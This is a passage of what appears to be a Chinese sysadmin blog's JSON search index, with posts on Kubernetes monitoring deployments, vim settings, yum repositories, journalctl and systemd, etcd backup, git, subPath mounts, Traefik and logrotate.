所有报警信息进入后的根路由，用来设置报警的分发策略 route: # 这里的标签列表是接收到报警信息后的重新分组标签，例如，接收到的报警信息里面有许多具有 cluster=A 和 alertname=LatncyHigh 这样的标签的报警信息将会批量被聚合到一个分组里面 group_by: ['alertname', 'cluster'] # 当一个新的报警分组被创建后，需要等待至少group_wait时间来初始化通知，这种方式可以确保您能有足够的时间为同一分组来获取多个警报，然后一起触发这个报警信息。 group_wait: 10s # 当第一个报警发送后，等待'group_interval'时间来发送新的一组报警信息。 group_interval: 1m # 每30分钟发送一次报警,直至恢复为止 repeat_interval: 30m # 默认的receiver：如果一个报警没有被一个route匹配，则发送给默认的接收器 receiver: default # 上面所有的属性都由所有子路由继承，并且可以在每个子路由上进行覆盖。 routes: # 告警规则中标签含有filesystem=node的报警会通过webhook接收器发送 - receiver: dingtalk match: severity: critical # - receiver: email # group_wait: 10s # match: # team: node receivers: - name: 'default' email_configs: - to: '742899387@qq.com' send_resolved: true - name: 'dingtalk' webhook_configs: - url: 'http://prometheus-webhook-dingtalk.kube-ops.svc.cluster.local:8060/dingtalk/webhook_mention_users/send' send_resolved: true # - name: 'wechat' # wechat_configs: # - send_resolved: true # api_secret: '' # corp_id: '' # agent_id: '' # to_party: '' # message: '{{ template \"wechat.tmpl\" . }}' kind: Deployment apiVersion: extensions/v1beta1 metadata: name: alertmanager namespace: kube-ops labels: app: alertmanager spec: template: metadata: name: alertmanager labels: app: alertmanager spec: containers: - name: alertmanager image: prom/alertmanager:v0.21.0 args: - \"--config.file=/etc/alertmanager/config.yml\" - \"--storage.path=/alertmanager/data\" #- \"--log.level=debug\" ports: - name: http containerPort: 9093 volumeMounts: - name: conf mountPath: /etc/alertmanager/ resources: requests: cpu: 100m memory: 256Mi limits: cpu: 100m memory: 256Mi volumes: - name: conf configMap: name: alert-config --- kind: Service apiVersion: v1 metadata: name: alertmanager namespace: kube-ops spec: type: ClusterIP ports: - name: alertmanager port: 9093 targetPort: http selector: app: alertmanager --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: alertmanager namespace: kube-ops annotations: kubernetes.io/ingress.class: \"nginx\" #nginx.ingress.kubernetes.io/auth-type: basic #nginx.ingress.kubernetes.io/auth-secret: alertmanager-basic-auth spec: rules: - host: alert.soulchild.cn http: paths: - path: / backend: serviceName: alertmanager servicePort: http ","date":"2020-08-26 10:53","objectID":"/post/1933/:2:0","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"三、grafana ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:0","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"1.创建pv、pvc --- apiVersion: v1 kind: PersistentVolume metadata: name: grafana spec: nfs: path: /nfsdata/ server: 10.0.0.10 capacity: storage: 1Gi accessModes: [ReadWriteOnce] persistentVolumeReclaimPolicy: Retain --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: grafana namespace: kube-ops spec: accessModes: [ReadWriteOnce] resources: requests: storage: 1Gi ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:1","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"2.创建configmap apiVersion: v1 kind: ConfigMap metadata: name: grafana-conf namespace: kube-ops data: grafana.ini: | [server] protocol = http # 访问协议，默认http http_port = 3000 # 监听的端口，默认是3000 root_url = http://1.3.4.1:30003 # 这是一个web上访问grafana的全路径url，默认是%(protocol)s://%(domain)s:%(http_port)s/ router_logging = false # 是否记录web请求日志，默认是false enable_gzip = true [smtp] enabled = true host = smtp.exmail.qq.com:587 user = 742899387@qq.com password = aaa skip_verify = true from_address = 742899387@qq.com from_name = Grafana [alerting] enable = true execute_alerts = true ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:2","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"3.创建deployment apiVersion: extensions/v1beta1 kind: Deployment metadata: name: grafana namespace: kube-ops labels: app: grafana spec: revisionHistoryLimit: 5 template: metadata: labels: app: grafana spec: containers: - name: grafana image: grafana/grafana:6.7.1 imagePullPolicy: IfNotPresent securityContext: runAsUser: 472 runAsGroup: 472 ports: - name: web containerPort: 3000 protocol: TCP resources: requests: cpu: 100m memory: 512Mi limits: cpu: 100m memory: 512Mi readinessProbe: initialDelaySeconds: 5 periodSeconds: 30 successThreshold: 1 failureThreshold: 5 timeoutSeconds: 10 httpGet: path: /api/health port: 3000 scheme: HTTP livenessProbe: failureThreshold: 5 successThreshold: 1 timeoutSeconds: 10 periodSeconds: 30 httpGet: path: /api/health port: 3000 scheme: HTTP volumeMounts: - name: config mountPath: /etc/grafana - name: data mountPath: /var/lib/grafana/ subPath: grafana initContainers: - name: change-dir image: busybox command: [\"chown\",\"-R\",\"472.472\",\"/var/lib/grafana\"] volumeMounts: - mountPath: /var/lib/grafana/ subPath: grafana name: data volumes: - name: config configMap: name: grafana-conf - name: data persistentVolumeClaim: claimName: grafana ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:3","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["监控","kubernetes"],"content":"4.创建service apiVersion: v1 kind: Service metadata: name: grafana namespace: kube-ops spec: type: NodePort selector: app: grafana ports: - port: 3000 targetPort: web nodePort: 30003 ","date":"2020-08-26 10:53","objectID":"/post/1933/:3:4","tags":["k8s","prometheus"],"title":"k8s部署prometheus+alertmanager+grafana","uri":"/post/1933/"},{"categories":["docker"],"content":"使用aspose.word 转换pdf中文乱码 Dockerfile FROM openjdk:8u212-jdk-alpine RUN mkdir /usr/share/fonts COPY fonts/ /usr/share/fonts RUN apk add mkfontscale mkfontdir \u0026\u0026 cd /usr/share/fonts;mkfontscale \u0026\u0026 cd /usr/share/fonts;mkfontdir;rm -fr /var/cache/apk/* ","date":"2020-08-24 17:50","objectID":"/post/1930/:0:0","tags":["docker"],"title":"容器中文字体问题,使用aspose.word转换pdf中文乱码","uri":"/post/1930/"},{"categories":["其他"],"content":"效果 16136-rtytmf4ycw.png 下载配色 mkdir $HOME/.vim/colors wget https://raw.githubusercontent.com/tomasr/molokai/master/colors/molokai.vim -O $HOME/.vim/colors/molokai.vim 2.修改vimrc vim $HOME/.vimrc \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e General \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Sets how many lines of history VIM has to remember \" \"set history=500 set cursorcolumn \" display numbers set nu \"visual edit everywhere \"\"set virtualedit=all \"show command set showcmd set cmdheight=2 set scrolloff=3 \" Enable filetype plugins filetype plugin on filetype indent on \" Set to auto read when a file is changed from the outside set autoread set nocompatible \" Search set ignorecase \" Ignore case when searching set smartcase \" When searching try to be smart about cases set hlsearch \" Highlight search results set incsearch \" Makes search act like search in modern browsers \" Don't redraw while executing macros (good performance config) set lazyredraw \" For regular expressions turn magic on set magic \" Show matching brackets when text indicator is over them set showmatch \" How many tenths of a second to blink when matching brackets set mat=2 \" No annoying sound on errors set noerrorbells \"set novisualbell set t_vb= set tm=500 \" Add a bit extra margin to the left set foldcolumn=1 set fdm=marker \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Colors and Fonts \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Enable syntax highlighting syntax enable colorscheme molokai \"colorscheme monokai \"colorscheme murphy \"colorscheme solarized \"let g:solarized_termcolors=256 \"let g:solarized_contrast=\"high\" \"default value is normal set t_Co=256 \"set vim terminal color set background=dark \"set guifont=Mono\\ 13 set guifont=monaco\\ 14 \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Statusline setting \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" set statusline=%1*\\ [%{Disp_Mode()}]\\ %*\\ %-5.58(%F%m%r%h%w%)\\ %2*\\ %-5.58(CWD:\\ %{getcwd()}%)\\ %*\\ Format:\\ [%{\u0026fenc!=''?\u0026fenc:\u0026enc}]\\ %3*\\ FileType:\\ %y\\ %*\\ %([L:\\ %l,C:\\ %c][%p%%]%)%\u003c hi User1 guibg=slateblue guifg=Gray ctermfg=Gray ctermbg=93 hi User2 guibg=#4876FF guifg=Gray ctermfg=Gray ctermbg=53 hi User3 guibg=Brown guifg=Gray ctermfg=Gray ctermbg=160 hi StatusLine guibg=#cccccc guifg=#222222 set laststatus=2 \"2:always display \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e file coding and decoding \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Set utf8 as standard encoding and en_US as the standard language set termencoding=utf-8 set encoding=utf8 set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,latin1 \"decoding list set fileencoding=utf-8 \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Files, backups and undo \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Turn backup off, since most stuff is in SVN, git et.c anyway... set nobackup set nowb set noswapfile \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" =\u003e Text, tab and indent related \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" 1 tab == 4 spaces set shiftwidth=4 set tabstop=4 set softtabstop=4 \" Use spaces instead of tabs set expandtab \" Be smart when using tabs set smarttab \"toggle paste mode with hitting F2 key set pastetoggle=\u003cF2\u003e \"set paste \"open paste mode set ai \"Auto indent set si \"Smart indent \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Wrap and breakline setting \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" Linebreak on 500 characters set lbr \"linebreak set tw=500 \"break at 500 words set showbreak==\u003e\\ \"show \"=\u003e\" before the break line set wrap \"Wrap lines \"configure backspace set backspace=eol,start,indent set whichwrap+=\u003c,\u003e,h,l \" Highlight the current line set cursorline \"highlight CursorLine guibg=#003853 ctermbg=24 gui=none cterm=none \"set clipboard=unnamed \"yank u","date":"2020-08-24 16:01","objectID":"/post/2639/:0:0","tags":["vim"],"title":"vim配置方案","uri":"/post/2639/"},{"categories":["基础内容"],"content":"-newerXY参数：X和Y均为变量。其中X指find的目标文件属性，Y代表参照属性。 a：访问时间 m：文件修改时间 c：inode更改时间 t：自定义时间(格式:yyyy-MM-dd hh:mm:ss) 查找到的文件中，mtime的时间大于2020-08-21的文件。 即：2020-08-21之后的文件 find ./ -type f -newermt '2020-08-21' 查找到的文件中，mtime的时间小于2020-08-21的文件。 即：2020-08-21之前的文件 find ./ -type f ! -newermt '2020-08-21' 查找到的文件中，mtime的时间大于2020-08-17的文件，小于2020-08-21的文件。 即：2020-08-17到2020-08-21之间的文件 find ./ -type f -newermt '2020-08-17' ! -newermt '2020-08-21' ","date":"2020-08-24 08:54","objectID":"/post/1927/:0:0","tags":[],"title":"find根据时间属性查找文件","uri":"/post/1927/"},{"categories":["基础内容"],"content":"1.准备本地仓库： mkdir devtools yum groupinstall \"Development tools\" --downloadonly --downloaddir=./dev/tools yum install -y createrepo cd devtools createrepo ./ 2.配置nginx： server{ server_name _; listen 8; root /var/www/devtools; autoindex on; } 找一台机器配置测试一下： 配置yum源 vim /etc/yum.repos.d/devtools.repo [base] name=CentOS-$releasever - Base baseurl=http://192.168.56.223/ gpgcheck=1 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 安装测试 yum install -y unzip ","date":"2020-08-19 16:23","objectID":"/post/1925/:0:0","tags":["yum"],"title":"制作一个yum源","uri":"/post/1925/"},{"categories":["基础内容"],"content":"两种方式： 方法1: yum install -y --downloadonly --downloaddir=/tmp/jq jq 方法2: yum install -y yum-utils yumdownloader --destdir=/tmp/jq --resolve jq ","date":"2020-08-19 16:06","objectID":"/post/1924/:0:0","tags":["yum"],"title":"yum只下载不安装","uri":"/post/1924/"},{"categories":["基础内容"],"content":"原文连接：http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html Systemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用journalctl一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件是/etc/systemd/journald.conf。 # 查看所有日志（默认情况下 ，只保存本次启动的日志） $ sudo journalctl # 查看内核日志（不显示应用日志） $ sudo journalctl -k # 查看系统本次启动的日志 $ sudo journalctl -b $ sudo journalctl -b -0 # 查看上一次启动的日志（需更改设置） $ sudo journalctl -b -1 # 查看指定时间的日志 $ sudo journalctl --since=\"2012-10-30 18:17:16\" $ sudo journalctl --since \"20 min ago\" $ sudo journalctl --since yesterday $ sudo journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\" $ sudo journalctl --since 09:00 --until \"1 hour ago\" # 显示尾部的最新10行日志 $ sudo journalctl -n # 显示尾部指定行数的日志 $ sudo journalctl -n 20 # 实时滚动显示最新日志 $ sudo journalctl -f # 查看指定服务的日志 $ sudo journalctl /usr/lib/systemd/systemd # 查看指定进程的日志 $ sudo journalctl _PID=1 # 查看某个路径的脚本的日志 $ sudo journalctl /usr/bin/bash # 查看指定用户的日志 $ sudo journalctl _UID=33 --since today # 查看某个 Unit 的日志 $ sudo journalctl -u nginx.service $ sudo journalctl -u nginx.service --since today # 实时滚动显示某个 Unit 的最新日志 $ sudo journalctl -u nginx.service -f # 合并显示多个 Unit 的日志 $ journalctl -u nginx.service -u php-fpm.service --since today # 查看指定优先级（及其以上级别）的日志，共有8级 # 0: emerg # 1: alert # 2: crit # 3: err # 4: warning # 5: notice # 6: info # 7: debug $ sudo journalctl -p err -b # 日志默认分页输出，--no-pager 改为正常的标准输出 $ sudo journalctl --no-pager # 以 JSON 格式（单行）输出 $ sudo journalctl -b -u nginx.service -o json # 以 JSON 格式（多行）输出，可读性更好 $ sudo journalctl -b -u nginx.serviceqq -o json-pretty # 显示日志占据的硬盘空间 $ sudo journalctl --disk-usage # 指定日志文件占据的最大空间 $ sudo journalctl --vacuum-size=1G # 指定日志文件保存多久 $ sudo journalctl --vacuum-time=1years ","date":"2020-08-19 10:04","objectID":"/post/1922/:0:0","tags":["systemd"],"title":"systemd-日志管理","uri":"/post/1922/"},{"categories":["基础内容"],"content":"原文链接：http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html ","date":"2020-08-19 09:58","objectID":"/post/1921/:0:0","tags":["systemd"],"title":"systemd管理服务--配置文件的含义","uri":"/post/1921/"},{"categories":["基础内容"],"content":"配置文件的区块 [Unit]区块通常是配置文件的第一个区块，用来定义 Unit 的元数据，以及配置与其他 Unit 的关系。它的主要字段如下。 Description：简短描述 Documentation：文档地址 Requires：当前 Unit 依赖的其他 Unit，如果它们没有运行，当前 Unit 会启动失败 Wants：与当前 Unit 配合的其他 Unit，如果它们没有运行，当前 Unit 不会启动失败 BindsTo：与Requires类似，它指定的 Unit 如果退出，会导致当前 Unit 停止运行 Before：如果该字段指定的 Unit 也要启动，那么必须在当前 Unit 之后启动 After：如果该字段指定的 Unit 也要启动，那么必须在当前 Unit 之前启动 Conflicts：这里指定的 Unit 不能与当前 Unit 同时运行 Condition…：当前 Unit 运行必须满足的条件，否则不会运行 Assert…：当前 Unit 运行必须满足的条件，否则会报启动失败 [Install]通常是配置文件的最后一个区块，用来定义如何启动，以及是否开机启动。它的主要字段如下。 WantedBy：它的值是一个或多个 Target，当前 Unit 激活时（enable）符号链接会放入/etc/systemd/system目录下面以 Target 名 + .wants后缀构成的子目录中 RequiredBy：它的值是一个或多个 Target，当前 Unit 激活时，符号链接会放入/etc/systemd/system目录下面以 Target 名 + .required后缀构成的子目录中 Alias：当前 Unit 可用于启动的别名 Also：当前 Unit 激活（enable）时，会被同时激活的其他 Unit [Service]区块用来 Service 的配置，只有 Service 类型的 Unit 才有这个区块。它的主要字段如下。 Type：定义启动时的进程行为。它有以下几种值。 Type=simple：默认值，执行ExecStart指定的命令，启动主进程 Type=forking：以 fork 方式从父进程创建子进程，创建后父进程会立即退出 Type=oneshot：一次性进程，Systemd 会等当前服务退出，再继续往下执行 Type=dbus：当前服务通过D-Bus启动 Type=notify：当前服务启动完毕，会通知Systemd，再继续往下执行 Type=idle：若有其他任务执行完毕，当前服务才会运行 ExecStart：启动当前服务的命令 ExecStartPre：启动当前服务之前执行的命令 ExecStartPost：启动当前服务之后执行的命令 ExecReload：重启当前服务时执行的命令 ExecStop：停止当前服务时执行的命令 ExecStopPost：停止当其服务之后执行的命令 RestartSec：自动重启当前服务间隔的秒数 Restart：定义何种情况 Systemd 会自动重启当前服务，可能的值包括always（总是重启）、on-success、on-failure、on-abnormal、on-abort、on-watchdog TimeoutSec：定义 Systemd 停止当前服务之前等待的秒数 Environment：指定环境变量 Unit 配置文件的完整字段清单，请参考官方文档。 ","date":"2020-08-19 09:58","objectID":"/post/1921/:1:0","tags":["systemd"],"title":"systemd管理服务--配置文件的含义","uri":"/post/1921/"},{"categories":["常用命令"],"content":" mvn install:install-file -Dfile=./aspose-cells-8.5.2.jar -DgroupId=com.aspose -DartifactId=aspose-cells -Dversion=8.5.2 -Dpackaging=jar mvn install:install-file -Dfile=./aspose.slides-15.9.0.jar -DgroupId=com.aspose -DartifactId=aspose.slides -Dversion=15.9.0 -Dpackaging=jar mvn install:install-file -Dfile=./aspose-words-16.8.0-javadoc.jar -DgroupId=com.aspose -DartifactId=aspose-words-javadoc -Dversion=16.8.0 -Dpackaging=jar mvn install:install-file -Dfile=./aspose-words-16.8.0-jdk16.jar -DgroupId=com.aspose -DartifactId=aspose-words-jdk16 -Dversion=16.8.0 -Dpackaging=jar ","date":"2020-08-17 09:13","objectID":"/post/1916/:0:0","tags":["maven"],"title":"安装jar包至本地仓库","uri":"/post/1916/"},{"categories":["kubernetes","databases"],"content":"命令: etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key 集群节点列表： etcd备份： ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key snapshot save 202008131304.db etcd恢复： ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key snapshot restore 202008131304.db ","date":"2020-08-17 09:12","objectID":"/post/1915/:0:0","tags":["k8s","etcd"],"title":"etcd备份","uri":"/post/1915/"},{"categories":["基础内容"],"content":"原文链接：https://mozillazg.com/2016/01/git-revert-depth-1.html 有时我们为了加快 clone 的速度会使用 –depth 参数，比如： git clone https://xxx/xxx.git --depth 1 如果我们之后要把之前的历史重新再 pull 下来呢？ 比如要把本地的仓库 push 到一个新的空仓库（ 会出现 error: failed to push some refs 错误 ）。 可以使用 –unshallow 参数： git pull --unshallow ","date":"2020-08-14 10:05","objectID":"/post/1913/:0:0","tags":["git"],"title":"git clone 时使用了 --depth 后，如何再重新拉取全部的历史","uri":"/post/1913/"},{"categories":["kubernetes"],"content":"有两种情况： 1.做为volumes使用时,subPath代表存储卷的子路径： apiVersion: v1 kind: Pod metadata: name: testpod0 spec: containers: - name: testc image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: data mountPath: /opt/data # 挂载的路径 subPath: data # volume的子路径 - name: data mountPath: /opt/model subPath: model volumes: - name: data persistentVolumeClaim: claimName: test-data 2.作为configmap/secret使用时,subPath代表configmap/secret的子路径： configmap: apiVersion: v1 kind: ConfigMap metadata: name: config-test data: config.ini: \"hello\" config.conf: \"nihao\" 单独挂载一个key为文件： apiVersion: v1 kind: Pod metadata: name: testpod spec: containers: - name: testc image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config.ini # 最终在容器中的文件名 subPath: config.ini #要挂载的confmap中的key的名称 volumes: - name: config-test configMap: name: config-test 挂载多个key为文件： apiVersion: v1 kind: Pod metadata: name: testpod2 spec: containers: - name: testc image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config.ini # 最终在容器中的文件名 subPath: config.ini #要挂载的confmap中的key的名称 - name: config-test mountPath: /etc/config.conf # 最终在容器中的文件名 subPath: config.conf #要挂载的confmap中的key的名称 volumes: - name: config-test configMap: name: config-test 多个container挂载不同的key： apiVersion: v1 kind: Pod metadata: name: testpod1 spec: containers: - name: testc imagePullPolicy: Never image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config/config.ini subPath: config.ini - name: testc1 imagePullPolicy: Never image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config/config.conf subPath: config.conf volumes: - name: config-test configMap: name: config-test items: - key: config.ini path: config.ini - key: config.conf path: config.conf ","date":"2020-08-04 11:48","objectID":"/post/1911/:0:0","tags":["k8s"],"title":"k8s中subpath的使用","uri":"/post/1911/"},{"categories":["kubernetes"],"content":"方式1:helm安装 1.给node添加标签，方便pod调度到指定节点 kubectl label nodes k8s-node04 traefik=true 2.自定义资源清单配置 vim my_values.yaml # 使用hostNetwork,service就不需要了 service: enabled: false # traefik是dashboard的配置，web和websecure是入口的配置 ports: traefik: expose: false port: 9000 web: expose: false port: 80 websecure: expose: false port: 443 # 监听1024以下的端口需要修改traefik默认的安全上下文配置 securityContext: capabilities: drop: [] readOnlyRootFilesystem: false runAsGroup: 0 runAsNonRoot: false runAsUser: 0 # 使用hostNetwork hostNetwork: true # 控制pod调度 nodeSelector: traefik: \"true\" 3.安装traefik helm install traefik traefik/traefik --version=8.9.1 -f my_values.yaml 4.获取hostIP kubectl get pod -l app.kubernetes.io/name=traefik -o jsonpath={.items[0].status.hostIP};echo 5.做好解析后访问 http入口: http://traefik.my.com/ https入口: https://traefik.my.com/ dashboard: http://traefik.my.com:9000/dashboard/ ","date":"2020-07-31 10:43","objectID":"/post/1910/:0:0","tags":["k8s"],"title":"hostNetwork方式部署traefik2.2","uri":"/post/1910/"},{"categories":["基础内容"],"content":"原文链接：https://www.lightxue.com/how-logrotate-works 日志实在是太有用了，它记录了程序运行时各种信息。通过日志可以分析用户行为，记录运行轨迹，查找程序问题。可惜磁盘的空间是有限的，就像飞机里的黑匣子，记录的信息再重要也只能记录最后一段时间发生的事。为了节省空间和整理方便，日志文件经常需要按时间或大小等维度分成多份，删除时间久远的日志文件。这就是通常说的日志滚动(log rotation)。 最近整理nginx日志，用了一个类Unix系统上的古老工具——logrotate，发现意外的好用。想了解这个工具的用法推荐看这里。我了解了一下这个工具的运行机制和原理，觉得挺有趣的。 ","date":"2020-07-28 17:25","objectID":"/post/1903/:0:1","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"运行机制 logrotate在很多Linux发行版上都是默认安装的。系统会定时运行logrotate，一般是每天一次。系统是这么实现按天执行的。crontab会每天定时执行/etc/cron.daily目录下的脚本，而这个目录下有个文件叫logrotate。在centos上脚本内容是这样的： /usr/sbin/logrotate /etc/logrotate.conf \u003e/dev/null 2\u003e\u00261 EXITVALUE=$? if [ $EXITVALUE != 0 ]; then /usr/bin/logger -t logrotate \"ALERT exited abnormally with [$EXITVALUE]\" fi exit 0 可以看到这个脚本主要做的事就是以/etc/logrotate.conf为配置文件执行了logrotate。就是这样实现了每天执行一次logrotate。 因为我的系统执行/etc/cron.daily目录下的脚本不是我想滚动日志的时间，所以我把/etc/cron.daily/logrotate拷了出来，改了一下logrotate配置文件的路径，然后在crontab里加上一条指定时间执行这个脚本的记录，自定义周期滚动日志就大功告成了。这种自定义的方式有两点要注意： 配置文件里一定要配置rotate 文件数目这个参数。如果不配置默认是0个，也就是只允许存在一份日志，刚切分出来的日志会马上被删除。多么痛的领悟，说多了都是泪。 执行logrotate命令最好加-f参数，不然有时候配置文件修改的内容不生效。 很多程序的会用到logrotate滚动日志，比如nginx。它们安装后，会在/etc/logrotate.d这个目录下增加自己的logrotate的配置文件。logrotate什么时候执行/etc/logrotate.d下的配置呢？看到/etc/logrotate.conf里这行，一切就不言而喻了。 include /etc/logrotate.d ","date":"2020-07-28 17:25","objectID":"/post/1903/:1:0","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"原理 logrotate是怎么做到滚动日志时不影响程序正常的日志输出呢？logrotate提供了两种解决方案。 ","date":"2020-07-28 17:25","objectID":"/post/1903/:2:0","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"Linux文件操作机制 介绍一下相关的Linux下的文件操作机制。 Linux文件系统里文件和文件名的关系如下图。 47492-vv62htw8w9.png 目录也是文件，文件里存着文件名和对应的inode编号。通过这个inode编号可以查到文件的元数据和文件内容。文件的元数据有引用计数、操作权限、拥有者ID、创建时间、最后修改时间等等。文件件名并不在元数据里而是在目录文件中。因此文件改名、移动，都不会修改文件，而是修改目录文件。 借《UNIX环境高级编程》里的图说一下进程打开文件的机制。 44632-1y2dd53q4f3.png 进程每新打开一个文件，系统会分配一个新的文件描述符给这个文件。文件描述符对应着一个文件表。表里面存着文件的状态信息（O_APPEND/O_CREAT/O_DIRECT…）、当前文件位置和文件的inode信息。系统会为每个进程创建独立的文件描述符和文件表，不同进程是不会共用同一个文件表。正因为如此，不同进程可以同时用不同的状态操作同一个文件的不同位置。文件表中存的是inode信息而不是文件路径，所以文件路径发生改变不会影响文件操作。 ","date":"2020-07-28 17:25","objectID":"/post/1903/:2:1","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"方案1：create 默认方案没有名字，姑且叫它create吧。因为这个方案会创建一个新的日志文件给程序输出日志，而且第二个方案名copytruncate是个配置项，与create配置项是互斥的。 这个方案的思路是重命名原日志文件，创建新的日志文件。详细步骤如下： 重命名程序当前正在输出日志的程序。因为重命名只会修改目录文件的内容，而进程操作文件靠的是inode编号，所以并不影响程序继续输出日志。 创建新的日志文件，文件名和原来日志文件一样。虽然新的日志文件和原来日志文件的名字一样，但是inode编号不一样，所以程序输出的日志还是往原日志文件输出。 通过某些方式通知程序，重新打开日志文件。程序重新打开日志文件，靠的是文件路径而不是inode编号，所以打开的是新的日志文件。 什么方式通知程序我重新打开日志呢，简单粗暴的方法是杀死进程重新打开。很多场景这种作法会影响在线的服务，于是有些程序提供了重新打开日志的接口，比如可以通过信号通知nginx。各种IPC方式都可以，前提是程序自身要支持这个功能。 有个地方值得一提，一个程序可能输出了多个需要滚动的日志文件。每滚动一个就通知程序重新打开所有日志文件不太划得来。有个sharedscripts的参数，让程序把所有日志都重命名了以后，只通知一次。 ","date":"2020-07-28 17:25","objectID":"/post/1903/:3:0","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"方案2：copytruncate 如果程序不支持重新打开日志的功能，又不能粗暴地重启程序，怎么滚动日志呢？copytruncate的方案出场了。 